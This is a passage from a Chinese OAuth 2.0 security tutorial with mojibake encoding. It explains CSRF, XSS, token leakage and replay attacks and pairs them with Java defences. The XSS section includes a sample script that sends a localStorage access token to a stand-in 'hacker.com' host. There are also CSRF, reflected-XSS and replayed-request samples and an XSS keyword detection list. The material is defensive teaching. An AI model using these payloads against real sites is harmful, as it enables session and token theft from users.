---
title: 1ã€OAuth2.0å®‰å…¨æ”»å‡»
---
## ğŸ“š ç›®å½•

1. [OAuth2.0å®‰å…¨æ¦‚è¿°](#1-OAuth20å®‰å…¨æ¦‚è¿°)
2. [CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»](#2-CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»)
3. [XSSè·¨ç«™è„šæœ¬æ”»å‡»](#3-XSSè·¨ç«™è„šæœ¬æ”»å‡»)
4. [Tokenæ³„æ¼ä¸çªƒå–](#4-Tokenæ³„æ¼ä¸çªƒå–)
5. [é‡æ”¾æ”»å‡»](#5-é‡æ”¾æ”»å‡»)
6. [æˆæƒç æ‹¦æˆªæ”»å‡»](#6-æˆæƒç æ‹¦æˆªæ”»å‡»)
7. [ç»¼åˆé˜²æŠ¤ç­–ç•¥](#7-ç»¼åˆé˜²æŠ¤ç­–ç•¥)
8. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#8-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ›¡ï¸ OAuth2.0å®‰å…¨æ¦‚è¿°


### 1.1 ä¸ºä»€ä¹ˆOAuth2.0éœ€è¦å®‰å…¨é˜²æŠ¤


**é€šä¿—ç†è§£**ï¼š
æƒ³è±¡ä½ çš„OAuth2.0å°±åƒä½ å®¶çš„é—¨é”ç³»ç»Ÿï¼Œè™½ç„¶è®¾è®¡å¾ˆå®‰å…¨ï¼Œä½†åäººæ€»ä¼šæƒ³åŠæ³•ç ´è§£ã€‚æˆ‘ä»¬éœ€è¦äº†è§£ä»–ä»¬çš„æ‰‹æ®µï¼Œæ‰èƒ½åšå¥½é˜²æŠ¤ã€‚

```
æ­£å¸¸çš„OAuth2.0æµç¨‹å°±åƒï¼š
ä½ ï¼ˆç”¨æˆ·ï¼‰â†’ æ‹¿ç€é’¥åŒ™ï¼ˆTokenï¼‰â†’ å¼€é—¨è¿›å…¥ç³»ç»Ÿ

æ”»å‡»è€…æƒ³åšçš„äº‹ï¼š
âŒ å·èµ°ä½ çš„é’¥åŒ™ï¼ˆTokençªƒå–ï¼‰
âŒ å¤åˆ¶ä½ çš„é’¥åŒ™ï¼ˆTokenæ³„æ¼ï¼‰
âŒ å‡è£…æ˜¯ä½ å»å¼€é—¨ï¼ˆCSRFæ”»å‡»ï¼‰
âŒ åœ¨ä½ å¼€é—¨æ—¶å·å·æºœè¿›å»ï¼ˆXSSæ”»å‡»ï¼‰
```

### 1.2 OAuth2.0çš„å®‰å…¨æŒ‘æˆ˜


**ğŸ”¸ æ ¸å¿ƒå®‰å…¨é—®é¢˜**
- **Tokenæ˜¯æ˜æ–‡ä¼ è¾“**ï¼šä¸€æ—¦è¢«æˆªè·å°±å¯ä»¥ä½¿ç”¨
- **å®¢æˆ·ç«¯ä¸ä¸€å®šå¯ä¿¡**ï¼šæµè§ˆå™¨ã€æ‰‹æœºAppå¯èƒ½è¢«æ”»å‡»
- **æˆæƒæµç¨‹å¤æ‚**ï¼šæ¯ä¸€æ­¥éƒ½å¯èƒ½å‡ºé—®é¢˜
- **ç¬¬ä¸‰æ–¹åº”ç”¨é£é™©**ï¼šæ¶æ„åº”ç”¨å¯èƒ½ç›—å–ç”¨æˆ·ä¿¡æ¯

---

## 2. ğŸš¨ CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»


### 2.1 ä»€ä¹ˆæ˜¯CSRFæ”»å‡»


**é€šä¿—è§£é‡Š**ï¼š
CSRFå°±åƒæœ‰äººè¶ä½ ç™»å½•äº†ç½‘é“¶ï¼Œå·å·è®©ä½ çš„æµè§ˆå™¨å‘èµ·è½¬è´¦è¯·æ±‚ã€‚ä½ æ˜æ˜æ²¡ç‚¹"è½¬è´¦"æŒ‰é’®ï¼Œä½†å› ä¸ºæµè§ˆå™¨é‡Œæœ‰ä½ çš„ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ï¼Œé“¶è¡Œä»¥ä¸ºæ˜¯ä½ æœ¬äººæ“ä½œã€‚

**åœ¨OAuth2.0ä¸­çš„è¡¨ç°**ï¼š
```
æ­£å¸¸æµç¨‹ï¼š
ä½ ç‚¹å‡»"ä½¿ç”¨å¾®ä¿¡ç™»å½•" â†’ è·³è½¬åˆ°å¾®ä¿¡æˆæƒé¡µé¢ â†’ ä½ åŒæ„æˆæƒ â†’ è¿”å›ç½‘ç«™

CSRFæ”»å‡»æµç¨‹ï¼š
é»‘å®¢æå‰å‡†å¤‡å¥½æˆæƒé“¾æ¥ â†’ è¯±å¯¼ä½ ç‚¹å‡» â†’ ä½ çš„æµè§ˆå™¨è‡ªåŠ¨å¸¦ä¸ŠCookie â†’ 
è¯¯ä»¥ä¸ºä½ åŒæ„äº†æˆæƒ â†’ é»‘å®¢è·å¾—ä½ çš„è´¦å·è®¿é—®æƒ
```

### 2.2 CSRFæ”»å‡»åŸç†è¯¦è§£


**æ”»å‡»è¿‡ç¨‹å›¾ç¤º**ï¼š
```
ç¬¬1æ­¥ï¼šç”¨æˆ·æ­£å¸¸ç™»å½•ç½‘ç«™A
ç”¨æˆ·æµè§ˆå™¨ ----ç™»å½•è¯·æ±‚----> ç½‘ç«™A
           <----Session Cookie----

ç¬¬2æ­¥ï¼šç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™B
ç”¨æˆ·æµè§ˆå™¨ ----è®¿é—®----> æ¶æ„ç½‘ç«™B

ç¬¬3æ­¥ï¼šæ¶æ„ç½‘ç«™Bè¿”å›æ”»å‡»ä»£ç 
æ¶æ„ç½‘ç«™B ---è¿”å›éšè—è¡¨å•---> ç”¨æˆ·æµè§ˆå™¨
                               â†“ è‡ªåŠ¨æäº¤
                        ç½‘ç«™Aï¼ˆè¯¯ä»¥ä¸ºæ˜¯ç”¨æˆ·æ“ä½œï¼‰
```

**å…·ä½“æ”»å‡»ç¤ºä¾‹**ï¼š
```html
<!-- é»‘å®¢åœ¨æ¶æ„ç½‘ç«™æ”¾ç½®çš„ä»£ç  -->
<img src="https://oauth.example.com/authorize?
  client_id=é»‘å®¢çš„åº”ç”¨ID&
  redirect_uri=é»‘å®¢çš„ç½‘ç«™&
  response_type=code&
  state=12345"
  style="display:none">
```

å½“ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨åŠ è½½è¿™ä¸ªå›¾ç‰‡ï¼Œå®é™…ä¸Šæ˜¯å‘èµ·äº†OAuthæˆæƒè¯·æ±‚ã€‚

### 2.3 CSRFæ”»å‡»çš„å½±å“


**âš ï¸ å±å®³åˆ†æ**ï¼š
- âœ— **è´¦å·ç»‘å®šè¢«åŠ«æŒ**ï¼šç”¨æˆ·è´¦å·è¢«ç»‘å®šåˆ°é»‘å®¢çš„ç¬¬ä¸‰æ–¹è´¦å·
- âœ— **è‡ªåŠ¨æˆæƒ**ï¼šç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æˆæƒäº†æ¶æ„åº”ç”¨
- âœ— **ä¿¡æ¯æ³„éœ²**ï¼šé»‘å®¢è·å¾—ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯è®¿é—®æƒé™
- âœ— **é’“é±¼æ”»å‡»**ï¼šç”¨æˆ·ä»¥ä¸ºåœ¨æ­£å¸¸æˆæƒï¼Œå®é™…æˆæƒç»™äº†å‡å†’åº”ç”¨

### 2.4 å¦‚ä½•æ£€æµ‹CSRFæ”»å‡»


**ğŸ” æ£€æµ‹æ–¹æ³•**ï¼š

**æ–¹æ³•ä¸€ï¼šæ£€æŸ¥Stateå‚æ•°**
```java
// æˆæƒè¯·æ±‚æ—¶ç”Ÿæˆéšæœºstate
String state = UUID.randomUUID().toString();
session.setAttribute("oauth_state", state);

// å›è°ƒæ—¶éªŒè¯state
String returnedState = request.getParameter("state");
String savedState = (String) session.getAttribute("oauth_state");

if (!returnedState.equals(savedState)) {
    // å¯èƒ½é­å—CSRFæ”»å‡»
    throw new SecurityException("Stateä¸åŒ¹é…ï¼Œå¯èƒ½çš„CSRFæ”»å‡»");
}
```

**æ–¹æ³•äºŒï¼šæ£€æŸ¥Refererå¤´**
```java
String referer = request.getHeader("Referer");
if (referer == null || !referer.startsWith("https://trusted-domain.com")) {
    // è¯·æ±‚æ¥æºå¯ç–‘
    logger.warn("å¯ç–‘çš„æˆæƒè¯·æ±‚æ¥æº: " + referer);
}
```

### 2.5 CSRFé˜²æŠ¤æ–¹æ¡ˆ


**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**ï¼š

**æ ¸å¿ƒé˜²æŠ¤ï¼šStateå‚æ•°**
```
Stateå‚æ•°å°±åƒæ˜¯ä¸€ä¸ª"å¯¹æš—å·"çš„è¿‡ç¨‹ï¼š

å‘èµ·æˆæƒæ—¶ï¼š
ç³»ç»Ÿç”Ÿæˆéšæœºæš—å·ï¼ˆstate=abc123ï¼‰â†’ ä¿å­˜åœ¨æœåŠ¡å™¨
                                  â†“
                            å‘é€ç»™OAuthæœåŠ¡å™¨

æˆæƒå›è°ƒæ—¶ï¼š
OAuthæœåŠ¡å™¨ --å¸¦ç€æš—å·è¿”å›--> ç³»ç»ŸéªŒè¯æš—å·æ˜¯å¦åŒ¹é…
                          â†“
                    åŒ¹é…æˆåŠŸæ‰ç»§ç»­å¤„ç†
```

**å®æ–½æ­¥éª¤**ï¼š
1. âœ… ç”Ÿæˆä¸å¯é¢„æµ‹çš„éšæœºstateå€¼
2. âœ… å°†stateä¿å­˜åœ¨æœåŠ¡å™¨Sessionä¸­
3. âœ… åœ¨æˆæƒURLä¸­æºå¸¦stateå‚æ•°
4. âœ… å›è°ƒæ—¶ä¸¥æ ¼éªŒè¯stateä¸€è‡´æ€§
5. âœ… stateä½¿ç”¨åç«‹å³å¤±æ•ˆ

---

## 3. ğŸ’‰ XSSè·¨ç«™è„šæœ¬æ”»å‡»


### 3.1 ä»€ä¹ˆæ˜¯XSSæ”»å‡»


**é€šä¿—è§£é‡Š**ï¼š
XSSå°±åƒé»‘å®¢åœ¨ä½ çš„ç½‘é¡µé‡Œå·å·å¡äº†ä¸€æ®µ"ç—…æ¯’ä»£ç "ï¼Œå½“ä½ æ‰“å¼€ç½‘é¡µæ—¶ï¼Œè¿™æ®µä»£ç å°±ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œå·èµ°ä½ çš„Tokenæˆ–Cookieã€‚

**å½¢è±¡æ¯”å–»**ï¼š
```
æ­£å¸¸ç½‘é¡µï¼šå°±åƒä¸€æœ¬å¹²å‡€çš„ä¹¦
XSSæ”»å‡»ï¼šé»‘å®¢åœ¨ä¹¦é‡Œå¤¹äº†ä¸€å¼ "ç‰¹æ®Šçš„çº¸"
        ä½ ç¿»åˆ°è¿™ä¸€é¡µæ—¶ï¼Œçº¸ä¸Šçš„"é­”æ³•"å°±ä¼šæ¿€æ´»
        å·å·æŠŠä½ çš„ç§˜å¯†ï¼ˆTokenï¼‰ä¼ ç»™é»‘å®¢
```

### 3.2 XSSåœ¨OAuth2.0ä¸­çš„æ”»å‡»æ–¹å¼


**æ”»å‡»ç±»å‹å¯¹æ¯”**ï¼š

| ç±»å‹ | **åŸç†** | **OAuth2.0åœºæ™¯** | **å±å®³ç¨‹åº¦** |
|------|---------|-----------------|-------------|
| **å­˜å‚¨å‹XSS** | `æ¶æ„è„šæœ¬å­˜åœ¨æ•°æ®åº“` | `ç”¨æˆ·è¯„è®ºåŒºæ’å…¥æ¶æ„ä»£ç çªƒå–Token` | ğŸ”´ æé«˜ |
| **åå°„å‹XSS** | `æ¶æ„è„šæœ¬åœ¨URLå‚æ•°ä¸­` | `é’“é±¼é“¾æ¥æºå¸¦è„šæœ¬çªƒå–æˆæƒç ` | ğŸŸ¡ ä¸­ç­‰ |
| **DOMå‹XSS** | `å‰ç«¯JavaScriptå¤„ç†ä¸å½“` | `redirect_uriè¢«æ³¨å…¥è„šæœ¬` | ğŸŸ  è¾ƒé«˜ |

**å­˜å‚¨å‹XSSæ”»å‡»ç¤ºä¾‹**ï¼š
```html
<!-- é»‘å®¢åœ¨ç”¨æˆ·è¯„è®ºä¸­æäº¤ -->
<script>
  // çªƒå–Access Token
  var token = localStorage.getItem('access_token');
  // å‘é€åˆ°é»‘å®¢æœåŠ¡å™¨
  fetch('https://hacker.com/steal?token=' + token);
</script>
```

ç”¨æˆ·æŸ¥çœ‹è¯„è®ºæ—¶ï¼Œè„šæœ¬è‡ªåŠ¨æ‰§è¡Œï¼ŒTokenè¢«ç›—ã€‚

**åå°„å‹XSSæ”»å‡»ç¤ºä¾‹**ï¼š
```
é»‘å®¢æ„é€ æ¶æ„é“¾æ¥ï¼š
https://oauth.example.com/callback?code=123&
<script>alert(document.cookie)</script>

ç”¨æˆ·ç‚¹å‡»åï¼Œè„šæœ¬åœ¨å›è°ƒé¡µé¢æ‰§è¡Œï¼ŒCookieè¢«çªƒå–
```

### 3.3 XSSæ”»å‡»çš„å½±å“


**âš ï¸ å±å®³åˆ†æ**ï¼š
- âœ— **Tokenç›´æ¥è¢«ç›—**ï¼šå­˜å‚¨åœ¨æµè§ˆå™¨çš„Tokenè¢«è„šæœ¬è¯»å–
- âœ— **ä¼šè¯åŠ«æŒ**ï¼šCookieè¢«çªƒå–ï¼Œé»‘å®¢å†’å……ç”¨æˆ·èº«ä»½
- âœ— **é’“é±¼é¡µé¢**ï¼šä¼ªé€ æˆæƒé¡µé¢ï¼Œéª—å–ç”¨æˆ·å‡­è¯
- âœ— **æ¶æ„æ“ä½œ**ï¼šä»¥ç”¨æˆ·èº«ä»½å‘èµ·è¯·æ±‚ï¼ˆè½¬è´¦ã€ä¿®æ”¹ä¿¡æ¯ç­‰ï¼‰

### 3.4 å¦‚ä½•æ£€æµ‹XSSæ”»å‡»


**ğŸ” æ£€æµ‹æ–¹æ³•**ï¼š

**æ–¹æ³•ä¸€ï¼šå†…å®¹å®‰å…¨ç­–ç•¥(CSP)ç›‘æ§**
```java
// è®¾ç½®CSPå¤´ï¼Œå¹¶å¯ç”¨æŠ¥å‘Š
response.setHeader("Content-Security-Policy", 
    "default-src 'self'; report-uri /csp-report");

// CSPè¿è§„ä¼šå‘é€æŠ¥å‘Šåˆ°æŒ‡å®šURL
@PostMapping("/csp-report")
public void handleCSP(@RequestBody String report) {
    logger.warn("æ£€æµ‹åˆ°å¯èƒ½çš„XSSæ”»å‡»: " + report);
    // åˆ†ææŠ¥å‘Šå†…å®¹ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ”»å‡»
}
```

**æ–¹æ³•äºŒï¼šè¾“å…¥éªŒè¯ä¸æ—¥å¿—è®°å½•**
```java
// æ£€æµ‹å±é™©å­—ç¬¦
public boolean containsXSS(String input) {
    String[] xssPatterns = {
        "<script", "javascript:", "onerror=", 
        "onclick=", "eval(", "alert("
    };
    
    for (String pattern : xssPatterns) {
        if (input.toLowerCase().contains(pattern)) {
            logger.warn("æ£€æµ‹åˆ°XSSæ”»å‡»å°è¯•: " + input);
            return true;
        }
    }
    return false;
}
```

### 3.5 XSSé˜²æŠ¤æ–¹æ¡ˆ


**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**ï¼š

**â‘  è¾“å‡ºè½¬ä¹‰**ï¼ˆæœ€é‡è¦ï¼‰
```java
// å¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡ŒHTMLè½¬ä¹‰
public String escapeHtml(String input) {
    return input
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("\"", "&quot;")
        .replace("'", "&#x27;");
}

// ä½¿ç”¨ç¤ºä¾‹
String userComment = escapeHtml(request.getParameter("comment"));
```

**â‘¡ å†…å®¹å®‰å…¨ç­–ç•¥(CSP)**
```java
// åªå…è®¸åŠ è½½åŒæºè„šæœ¬
response.setHeader("Content-Security-Policy", 
    "script-src 'self'");
```

**â‘¢ HttpOnly Cookie**
```java
// Tokenå­˜å‚¨åœ¨HttpOnly Cookieä¸­ï¼ŒJavaScriptæ— æ³•è¯»å–
Cookie cookie = new Cookie("access_token", token);
cookie.setHttpOnly(true);  // å…³é”®è®¾ç½®
cookie.setSecure(true);    // åªåœ¨HTTPSä¼ è¾“
response.addCookie(cookie);
```

**â‘£ é¿å…åœ¨URLä¸­ä¼ é€’æ•æ„Ÿä¿¡æ¯**
```
âŒ ä¸å®‰å…¨ï¼š
https://example.com/callback?access_token=abc123

âœ… å®‰å…¨ï¼š
å°†Tokenæ”¾åœ¨è¯·æ±‚ä½“æˆ–Headerä¸­
Authorization: Bearer abc123
```

---

## 4. ğŸ”“ Tokenæ³„æ¼ä¸çªƒå–


### 4.1 Tokenæ³„æ¼çš„å¸¸è§åœºæ™¯


**é€šä¿—ç†è§£**ï¼š
Tokenå°±åƒä½ çš„"ä¸´æ—¶é€šè¡Œè¯"ï¼Œä¸€æ—¦æ³„æ¼ï¼Œåˆ«äººæ¡åˆ°å°±èƒ½å†’å……ä½ ã€‚æ³„æ¼çš„é€”å¾„å¾ˆå¤šï¼Œæˆ‘ä»¬è¦é€ä¸€é˜²èŒƒã€‚

**æ³„æ¼åœºæ™¯å¯¹æ¯”**ï¼š

| åœºæ™¯ | **æ³„æ¼æ–¹å¼** | **å±å®³ç­‰çº§** | **å…¸å‹ä¾‹å­** |
|------|------------|-------------|-------------|
| **æµè§ˆå™¨URL** | `Tokenåœ¨åœ°å€æ æ˜¾ç¤º` | ğŸ”´ é«˜ | `historyè®°å½•è¢«æŸ¥çœ‹` |
| **æ—¥å¿—æ–‡ä»¶** | `Tokenè¢«è®°å½•åˆ°æ—¥å¿—` | ğŸŸ  ä¸­ | `æœåŠ¡å™¨æ—¥å¿—æ³„éœ²` |
| **ç½‘ç»œæŠ“åŒ…** | `HTTPæ˜æ–‡ä¼ è¾“` | ğŸ”´ é«˜ | `å…¬å…±WiFiæŠ“åŒ…` |
| **å‰ç«¯å­˜å‚¨** | `localStorage/sessionStorage` | ğŸŸ¡ ä¸­ | `XSSæ”»å‡»çªƒå–` |
| **ç¬¬ä¸‰æ–¹åº“** | `SDKä¸­Tokenå¤„ç†ä¸å½“` | ğŸŸ  ä¸­ | `ç»Ÿè®¡SDKä¸Šä¼ Token` |

### 4.2 URLæ³„æ¼é—®é¢˜


**é—®é¢˜åˆ†æ**ï¼š
```
âŒ å±é™©åšæ³•ï¼šå°†Tokenæ”¾åœ¨URLä¸­
https://api.example.com/user?access_token=abc123

é—®é¢˜ï¼š
â†’ æµè§ˆå™¨å†å²è®°å½•ä¿å­˜äº†Token
â†’ æœåŠ¡å™¨è®¿é—®æ—¥å¿—è®°å½•äº†Token  
â†’ Refererå¤´å¯èƒ½æ³„éœ²Tokenåˆ°ç¬¬ä¸‰æ–¹ç½‘ç«™
â†’ ä»£ç†æœåŠ¡å™¨å¯èƒ½è®°å½•å®Œæ•´URL
```

**æ­£ç¡®åšæ³•**ï¼š
```java
// âœ… ä½¿ç”¨Authorization Header
HttpHeaders headers = new HttpHeaders();
headers.set("Authorization", "Bearer " + accessToken);
HttpEntity<String> entity = new HttpEntity<>(headers);

restTemplate.exchange(url, HttpMethod.GET, entity, String.class);
```

### 4.3 æ—¥å¿—æ³„æ¼é—®é¢˜


**é—®é¢˜åˆ†æ**ï¼š
```java
// âŒ é”™è¯¯ç¤ºä¾‹ï¼šæ—¥å¿—ä¸­æš´éœ²Token
logger.info("ç”¨æˆ·ç™»å½•ï¼ŒToken: " + accessToken);

// æ—¥å¿—æ–‡ä»¶å†…å®¹ï¼š
// 2025-09-23 10:30:15 ç”¨æˆ·ç™»å½•ï¼ŒToken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**æ­£ç¡®åšæ³•**ï¼š
```java
// âœ… åªè®°å½•Tokençš„éƒ¨åˆ†ä¿¡æ¯
String maskedToken = accessToken.substring(0, 8) + "...";
logger.info("ç”¨æˆ·ç™»å½•ï¼ŒTokenå‰ç¼€: " + maskedToken);

// æˆ–ä½¿ç”¨è„±æ•å·¥å…·
logger.info("ç”¨æˆ·ç™»å½•ï¼ŒToken: {}", maskSensitive(accessToken));

private String maskSensitive(String token) {
    if (token.length() <= 8) return "***";
    return token.substring(0, 4) + "..." + token.substring(token.length() - 4);
}
```

### 4.4 ç½‘ç»œä¼ è¾“æ³„æ¼


**HTTPSçš„é‡è¦æ€§**ï¼š
```
HTTPæ˜æ–‡ä¼ è¾“ï¼š
å®¢æˆ·ç«¯ --Token: abc123--> è·¯ç”±å™¨ --Token: abc123--> æœåŠ¡å™¨
              â†‘ é»‘å®¢å¯ä»¥çœ‹åˆ°Tokenï¼

HTTPSåŠ å¯†ä¼ è¾“ï¼š
å®¢æˆ·ç«¯ --åŠ å¯†æ•°æ®--> è·¯ç”±å™¨ --åŠ å¯†æ•°æ®--> æœåŠ¡å™¨
              â†‘ é»‘å®¢åªèƒ½çœ‹åˆ°ä¹±ç 
```

**å¼ºåˆ¶HTTPSé…ç½®**ï¼š
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.requiresChannel()
            .anyRequest()
            .requiresSecure();  // å¼ºåˆ¶HTTPS
        return http.build();
    }
}
```

### 4.5 å‰ç«¯å­˜å‚¨æ³„æ¼


**å­˜å‚¨æ–¹å¼å¯¹æ¯”**ï¼š

```
localStorageï¼ˆä¸æ¨èå­˜Tokenï¼‰ï¼š
â†’ JavaScriptå¯ä»¥éšæ„è¯»å–
â†’ XSSæ”»å‡»å¯ä»¥çªƒå–
â†’ æ²¡æœ‰è¿‡æœŸæ—¶é—´ï¼Œé•¿æœŸæœ‰æ•ˆ
â†’ åŒåŸŸåä¸‹æ‰€æœ‰é¡µé¢å…±äº«

HttpOnly Cookieï¼ˆæ¨èï¼‰ï¼š
â†’ JavaScriptæ— æ³•è¯»å–
â†’ XSSæ”»å‡»æ— æ³•è·å–
â†’ å¯ä»¥è®¾ç½®è¿‡æœŸæ—¶é—´
â†’ åªåœ¨HTTPè¯·æ±‚ä¸­è‡ªåŠ¨æºå¸¦
```

**å®‰å…¨å­˜å‚¨æ–¹æ¡ˆ**ï¼š
```java
// âœ… åç«¯è®¾ç½®HttpOnly Cookie
@PostMapping("/login")
public ResponseEntity<?> login() {
    String token = generateToken();
    
    ResponseCookie cookie = ResponseCookie.from("access_token", token)
        .httpOnly(true)        // JavaScriptæ— æ³•è®¿é—®
        .secure(true)          // ä»…HTTPSä¼ è¾“
        .sameSite("Strict")    // é˜²æ­¢CSRF
        .maxAge(3600)          // 1å°æ—¶è¿‡æœŸ
        .path("/")
        .build();
    
    return ResponseEntity.ok()
        .header(HttpHeaders.SET_COOKIE, cookie.toString())
        .body("ç™»å½•æˆåŠŸ");
}
```

### 4.6 Tokené˜²æ³„æ¼ç»¼åˆæ–¹æ¡ˆ


**ğŸ›¡ï¸ é˜²æŠ¤æ¸…å•**ï¼š

**â‘  Tokenä¼ è¾“å®‰å…¨**
- âœ… å¼ºåˆ¶ä½¿ç”¨HTTPS
- âœ… Tokenæ”¾åœ¨Headerä¸­ï¼Œä¸æ”¾URL
- âœ… ä½¿ç”¨POSTè¯·æ±‚ä¼ é€’Token

**â‘¡ Tokenå­˜å‚¨å®‰å…¨**
- âœ… ä¼˜å…ˆä½¿ç”¨HttpOnly Cookie
- âœ… é¿å…ä½¿ç”¨localStorage
- âœ… TokenåŠ å¯†å­˜å‚¨

**â‘¢ Tokenä½¿ç”¨å®‰å…¨**
- âœ… è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´ï¼ˆ15åˆ†é’Ÿ-1å°æ—¶ï¼‰
- âœ… ä½¿ç”¨Refresh Tokenåˆ·æ–°
- âœ… Tokenä½¿ç”¨ååŠæ—¶å¤±æ•ˆ

**â‘£ æ—¥å¿—ä¸ç›‘æ§**
- âœ… æ—¥å¿—ä¸­è„±æ•Tokenä¿¡æ¯
- âœ… ç›‘æ§Tokenå¼‚å¸¸ä½¿ç”¨
- âœ… Tokenæ³„æ¼åå¿«é€Ÿæ’¤é”€

---

## 5. ğŸ” é‡æ”¾æ”»å‡»


### 5.1 ä»€ä¹ˆæ˜¯é‡æ”¾æ”»å‡»


**é€šä¿—è§£é‡Š**ï¼š
é‡æ”¾æ”»å‡»å°±åƒå°å·å·çœ‹åˆ°äº†ä½ å®¶é—¨ç¦å¯†ç ï¼Œç„¶ååå¤ä½¿ç”¨è¿™ä¸ªå¯†ç è¿›å‡ºä½ å®¶ã€‚å³ä½¿å¯†ç æ²¡å˜ï¼Œä½†å°å·ä¸åº”è¯¥èƒ½ç”¨ã€‚

**åœ¨OAuth2.0ä¸­çš„è¡¨ç°**ï¼š
```
æ­£å¸¸æµç¨‹ï¼š
ç”¨æˆ·è·å¾—Token â†’ ä½¿ç”¨Tokenè®¿é—®API â†’ Tokenæœ‰æ•ˆ

é‡æ”¾æ”»å‡»ï¼š
é»‘å®¢æˆªè·Token â†’ å¤åˆ¶Token â†’ åå¤ä½¿ç”¨Tokenè®¿é—®API
                                â†“
                        ç³»ç»Ÿè¯¯ä»¥ä¸ºæ˜¯åˆæ³•è¯·æ±‚
```

### 5.2 é‡æ”¾æ”»å‡»çš„åŸç†


**æ”»å‡»è¿‡ç¨‹å›¾ç¤º**ï¼š
```
ç¬¬1æ­¥ï¼šé»‘å®¢æˆªè·è¯·æ±‚
ç”¨æˆ· ----Token: abc123----> APIæœåŠ¡å™¨
         â†‘
     é»‘å®¢æŠ“åŒ…æˆªè·

ç¬¬2æ­¥ï¼šé»‘å®¢é‡æ”¾è¯·æ±‚
é»‘å®¢ ----Token: abc123----> APIæœåŠ¡å™¨
                            â†“
                    æœåŠ¡å™¨ä»¥ä¸ºæ˜¯ç”¨æˆ·è¯·æ±‚
                            â†“
                      è¿”å›ç”¨æˆ·æ•æ„Ÿæ•°æ®
```

**å…¸å‹æ”»å‡»åœºæ™¯**ï¼š
```java
// é»‘å®¢æˆªè·çš„è¯·æ±‚
POST /api/transfer HTTP/1.1
Authorization: Bearer eyJhbGci...
Content-Type: application/json

{
  "to": "é»‘å®¢è´¦æˆ·",
  "amount": 10000
}

// é»‘å®¢åå¤å‘é€è¿™ä¸ªè¯·æ±‚
// æ¯æ¬¡éƒ½èƒ½æˆåŠŸè½¬è´¦10000å…ƒï¼
```

### 5.3 é‡æ”¾æ”»å‡»çš„å½±å“


**âš ï¸ å±å®³åˆ†æ**ï¼š
- âœ— **èµ„é‡‘æŸå¤±**ï¼šè½¬è´¦è¯·æ±‚è¢«é‡æ”¾ï¼Œå¤šæ¬¡æ‰£æ¬¾
- âœ— **æ•°æ®æ³„éœ²**ï¼šæŸ¥è¯¢è¯·æ±‚è¢«é‡æ”¾ï¼Œæ•æ„Ÿä¿¡æ¯å¤šæ¬¡è·å–
- âœ— **æ¶æ„æ“ä½œ**ï¼šåˆ é™¤ã€ä¿®æ”¹è¯·æ±‚è¢«é‡æ”¾ï¼Œé€ æˆç ´å
- âœ— **èµ„æºè€—å°½**ï¼šå¤§é‡é‡æ”¾è¯·æ±‚å¯¼è‡´æœåŠ¡å™¨è´Ÿè½½è¿‡é«˜

### 5.4 å¦‚ä½•æ£€æµ‹é‡æ”¾æ”»å‡»


**ğŸ” æ£€æµ‹æ–¹æ³•**ï¼š

**æ–¹æ³•ä¸€ï¼šè¯·æ±‚å”¯ä¸€æ€§æ£€æµ‹**
```java
@Component
public class ReplayAttackDetector {
    
    private Set<String> processedRequests = new ConcurrentHashSet<>();
    
    public boolean isReplayAttack(String requestId, String token) {
        String uniqueKey = requestId + ":" + token;
        
        // æ£€æŸ¥æ˜¯å¦å·²å¤„ç†è¿‡
        if (processedRequests.contains(uniqueKey)) {
            logger.warn("æ£€æµ‹åˆ°é‡æ”¾æ”»å‡»: " + uniqueKey);
            return true;
        }
        
        // æ ‡è®°ä¸ºå·²å¤„ç†
        processedRequests.add(uniqueKey);
        return false;
    }
}
```

**æ–¹æ³•äºŒï¼šæ—¶é—´æˆ³æ£€æµ‹**
```java
public boolean isRequestExpired(long timestamp) {
    long currentTime = System.currentTimeMillis();
    long diff = currentTime - timestamp;
    
    // è¯·æ±‚è¶…è¿‡5åˆ†é’Ÿè§†ä¸ºè¿‡æœŸ
    if (diff > 5 * 60 * 1000) {
        logger.warn("æ£€æµ‹åˆ°è¿‡æœŸè¯·æ±‚ï¼Œå¯èƒ½æ˜¯é‡æ”¾æ”»å‡»");
        return true;
    }
    return false;
}
```

### 5.5 é‡æ”¾æ”»å‡»é˜²æŠ¤æ–¹æ¡ˆ


**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**ï¼š

**â‘  Nonceï¼ˆä¸€æ¬¡æ€§éšæœºæ•°ï¼‰**
```
Nonceå°±åƒæ˜¯"ä¸€æ¬¡æ€§é—¨ç¥¨"ï¼š

å®¢æˆ·ç«¯è¯·æ±‚ï¼š
ç”ŸæˆéšæœºNonceå€¼ â†’ è¿åŒTokenä¸€èµ·å‘é€ â†’ æœåŠ¡å™¨éªŒè¯
                                      â†“
                            è®°å½•Nonceï¼Œæ‹’ç»é‡å¤çš„Nonce

é‡æ”¾æ”»å‡»ï¼š
é»‘å®¢ç”¨ç›¸åŒNonce â†’ æœåŠ¡å™¨æ£€æµ‹åˆ°é‡å¤ â†’ æ‹’ç»è¯·æ±‚
```

**å®ç°ç¤ºä¾‹**ï¼š
```java
@RestController
public class SecureController {
    
    @Autowired
    private NonceStore nonceStore;
    
    @PostMapping("/api/secure")
    public ResponseEntity<?> secureAPI(
        @RequestHeader("X-Nonce") String nonce,
        @RequestHeader("Authorization") String token) {
        
        // éªŒè¯Nonceå”¯ä¸€æ€§
